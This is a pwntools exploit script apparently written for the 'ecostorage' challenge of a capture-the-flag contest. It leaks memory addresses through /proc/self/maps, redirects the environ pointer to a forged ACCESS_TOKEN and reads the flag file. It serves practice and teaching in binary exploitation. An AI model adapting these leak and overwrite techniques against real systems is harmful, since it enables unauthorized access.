#!/usr/bin/python3

from pwn import *
from sys import argv

if len(argv) != 3:
    hostname = "localhost"
    port = 1337
else:
    hostname = argv[1]
    port = int(argv[2])

elf = ELF('./ecostorage')
libc = ELF('./libc.so.6')

REMOTE = False
DEBUG = not REMOTE

context.arch = 'amd64'
context.terminal = ['gnome-terminal', '--title=GDB-Pwn', '-e']

if REMOTE:
    r = remote(hostname, port)
else:
    r = process('ACCESS_TOKEN=1234 ./ecostorage', shell=True)

r.sendlineafter('>> ', '1')
r.sendlineafter('Filename: ', '/proc/self/maps')

res = r.recvuntil('\n-=', drop=True).splitlines()

code_base = int(res[1].split(b'-')[0], 16)
libc_base = int(res[7].split(b'-')[0], 16)
environ_addr = libc_base + libc.sym['environ']

log.success(f'code base is @ {hex(code_base)}')
log.success(f'libc base is @ {hex(libc_base)}')
log.success(f'environ is @ {hex(environ_addr)}')

filename_addr = code_base + 0x4040 + 0x8

log.success(f'filename addr is @{hex(filename_addr)}')

r.sendlineafter('>> ', '2')
r.sendlineafter('token: ', 'THCON2022')
r.sendlineafter('access!\n', f'{environ_addr} {filename_addr}')

filename = p64(0x0)
filename += p64(filename_addr + 0x10)
filename += p64(0)
filename += b"ACCESS_TOKEN=1337\x00"

r.sendlineafter('>> ', '1')
r.sendlineafter('Filename: ', filename)

r.sendlineafter('>> ', '2')
r.sendlineafter('token: ', '1337')

r.sendlineafter('>> ', '1')
r.sendlineafter('Filename: ', 'flag.txt')

flag = r.recvuntil('\n-=').splitlines()[1]

log.success(f'Flag: {flag.decode()}')

r.sendlineafter('>> ', '0')
r.close()
